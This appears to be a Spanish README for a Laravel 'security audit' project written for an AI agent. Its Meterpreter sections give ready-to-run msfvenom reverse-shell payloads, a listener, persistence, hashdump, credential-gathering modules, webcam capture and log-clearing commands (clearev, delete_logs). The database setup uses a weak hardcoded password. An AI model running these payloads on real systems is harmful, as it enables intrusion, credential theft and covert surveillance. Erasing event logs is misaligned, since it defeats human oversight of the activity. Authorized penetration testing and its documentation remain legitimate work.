# Sistema de Auditoría Tramontina

## Documentación para Agente MI - Herramientas de Auditoría

Este proyecto Laravel 10 está diseñado para la empresa Tramontina con el propósito de realizar auditorías de seguridad utilizando **Meterpreter** para mantenimiento de acceso y **Syslog** para análisis de datos.

---

## 📋 Índice

1. [Configuración del Entorno](#configuración-del-entorno)
2. [Meterpreter - Mantenimiento de Acceso](#meterpreter---mantenimiento-de-acceso)
3. [Syslog - Análisis de Datos](#syslog---análisis-de-datos)
4. [Configuración de Laravel](#configuración-de-laravel)
5. [Uso de las Herramientas](#uso-de-las-herramientas)
6. [Procedimientos de Auditoría](#procedimientos-de-auditoría)

---

## ⚙️ Configuración del Entorno

### Requisitos Previos
- PHP 8.1+
- Composer
- PostgreSQL
- Node.js y NPM
- Metasploit Framework
- Rsyslog o Syslog-ng

### Base de Datos PostgreSQL
```sql
-- Crear la base de datos
CREATE DATABASE tramontina;

-- Crear usuario
CREATE USER postgres WITH PASSWORD '0808';
GRANT ALL PRIVILEGES ON DATABASE tramontina TO postgres;
```

---

## 🔴 Meterpreter - Mantenimiento de Acceso

### ¿Qué es Meterpreter?
Meterpreter es un payload avanzado y dinámico que forma parte del framework Metasploit. Se utiliza para mantener acceso persistente a sistemas comprometidos durante las pruebas de penetración.

### Configuración en el Proyecto

#### 1. Variables de Entorno Configuradas
```bash
PENETRATION_TEST_MODE=false    # Activar solo durante pruebas autorizadas
METASPLOIT_HOST=127.0.0.1     # IP del servidor Metasploit
METASPLOIT_PORT=4444          # Puerto para conexiones
```

#### 2. Comandos Básicos de Meterpreter

**Generar Payload:**
```bash
# Payload para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe

# Payload para Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf
```

**Configurar Listener:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

#### 3. Comandos de Meterpreter para Auditoría

**Información del Sistema:**
```bash
sysinfo                    # Información del sistema
getuid                     # Usuario actual
ps                         # Procesos en ejecución
netstat                    # Conexiones de red
```

**Persistencia:**
```bash
run persistence -S -U -X -i 60 -p 4445 -r 192.168.1.100
```

**Captura de Pantalla:**
```bash
screenshot                 # Tomar captura de pantalla
webcam_snap               # Tomar foto con webcam
```

**Extracción de Datos:**
```bash
hashdump                  # Extraer hashes de contraseñas
download archivo.txt      # Descargar archivo
upload archivo.txt        # Subir archivo
```

---

## 📊 Syslog - Análisis de Datos

### ¿Qué es Syslog?
Syslog es un protocolo estándar para el registro de mensajes del sistema. Permite centralizar logs de múltiples sistemas para análisis y monitoreo.

### Configuración en el Proyecto

#### 1. Variables de Entorno
```bash
SYSLOG_HOST=127.0.0.1      # Servidor Syslog
SYSLOG_PORT=514            # Puerto UDP estándar
SYSLOG_PROTOCOL=udp        # Protocolo de transporte
SYSLOG_FACILITY=local0     # Facilidad para clasificar logs
SYSLOG_LEVEL=info          # Nivel mínimo de logs
```

#### 2. Configuración de Rsyslog

**Archivo `/etc/rsyslog.conf`:**
```bash
# Habilitar recepción UDP
$ModLoad imudp
$UDPServerRun 514
$UDPServerAddress 127.0.0.1

# Configurar facility local0 para Tramontina
local0.*    /var/log/tramontina/auditoria.log

# Separar por prioridad
local0.info     /var/log/tramontina/info.log
local0.warning  /var/log/tramontina/warning.log
local0.err      /var/log/tramontina/error.log
```

#### 3. Análisis de Logs con Comandos

**Monitoreo en Tiempo Real:**
```bash
# Ver logs en tiempo real
tail -f /var/log/tramontina/auditoria.log

# Filtrar por IP específica
grep "192.168.1.100" /var/log/tramontina/auditoria.log

# Buscar intentos de login fallidos
grep "Failed login" /var/log/tramontina/auditoria.log
```

**Análisis Estadístico:**
```bash
# Contar eventos por hora
awk '{print $3}' /var/log/tramontina/auditoria.log | cut -d: -f1 | sort | uniq -c

# Top 10 IPs más activas
awk '{print $4}' /var/log/tramontina/auditoria.log | sort | uniq -c | sort -nr | head -10
```

---

## 🔧 Configuración de Laravel

### 1. Configuración de Logs

**Archivo `config/logging.php`:**
```php
'channels' => [
    'audit' => [
        'driver' => 'syslog',
        'level' => 'info',
        'facility' => LOG_LOCAL0,
        'formatter' => 'json',
    ],
    
    'security' => [
        'driver' => 'daily',
        'path' => storage_path('logs/security.log'),
        'level' => 'warning',
        'days' => 30,
    ],
],
```

### 2. Middleware de Auditoría

**Crear Middleware:**
```bash
php artisan make:middleware AuditLogger
```

### 3. Migraciones para Auditoría

**Crear Migración:**
```bash
php artisan make:migration create_audit_logs_table
```

---

## 🚀 Uso de las Herramientas

### Escenario 1: Auditoría de Acceso No Autorizado

#### Paso 1: Preparar Meterpreter
```bash
# 1. Generar payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_AUDITORIA LPORT=4444 -f exe > audit_test.exe

# 2. Configurar listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST IP_AUDITORIA; set LPORT 4444; exploit"
```

#### Paso 2: Monitorear con Syslog
```bash
# Monitorear logs de autenticación
tail -f /var/log/auth.log | tee -a /var/log/tramontina/auditoria.log

# En Laravel, registrar eventos
Log::channel('audit')->info('Penetration test initiated', [
    'source_ip' => request()->ip(),
    'user_agent' => request()->userAgent(),
    'timestamp' => now(),
]);
```

### Escenario 2: Análisis Post-Compromiso

#### Con Meterpreter:
```bash
# Una vez conectado
meterpreter > sysinfo
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > run post/windows/gather/credentials/windows_autologin
meterpreter > run post/windows/gather/hashdump
```

#### Con Syslog Analysis:
```bash
# Buscar patrones sospechosos
grep -E "(Failed|Authentication|Login)" /var/log/tramontina/auditoria.log | \
awk '{print $1, $2, $3, $9}' | sort | uniq -c | sort -nr

# Análisis de horarios inusuales
grep "$(date -d '22:00' '+%H')\|$(date -d '23:00' '+%H')\|$(date -d '00:00' '+%H')" \
/var/log/tramontina/auditoria.log
```

---

## 📋 Procedimientos de Auditoría

### 1. Pre-Auditoría
- [ ] Obtener autorización por escrito
- [ ] Configurar entorno de testing aislado
- [ ] Verificar conectividad con sistemas objetivo
- [ ] Configurar logging centralizado

### 2. Durante la Auditoría
- [ ] Mantener logs detallados de todas las actividades
- [ ] Documentar vulnerabilidades encontradas
- [ ] Tomar capturas de pantalla como evidencia
- [ ] Registrar timestamps de todos los eventos

### 3. Post-Auditoría
- [ ] Limpiar todos los payloads instalados
- [ ] Generar reporte completo
- [ ] Analizar logs recopilados
- [ ] Proporcionar recomendaciones de seguridad

---

## 🛡️ Comandos de Emergencia

### Limpiar Trazas de Meterpreter:
```bash
# En meterpreter session
meterpreter > clearev
meterpreter > run post/windows/manage/delete_logs
```

### Backup de Logs:
```bash
# Comprimir y backup logs importantes
tar -czf tramontina_audit_$(date +%Y%m%d).tar.gz /var/log/tramontina/
```

---

## 📞 Contactos de Emergencia

- **Responsable de Seguridad:** auditoria@tramontina.com
- **Administrador de Sistemas:** admin@tramontina.com
- **Equipo Legal:** legal@tramontina.com

---

## ⚠️ Advertencias Importantes

1. **NUNCA usar estas herramientas sin autorización explícita**
2. **Siempre trabajar en entornos controlados**
3. **Mantener confidencialidad absoluta**
4. **Seguir las leyes locales e internacionales**
5. **Documentar TODO el proceso**

---

*Documentación creada para el proyecto de Auditoría - Tramontina*
*Fecha: $(date +%Y-%m-%d)* 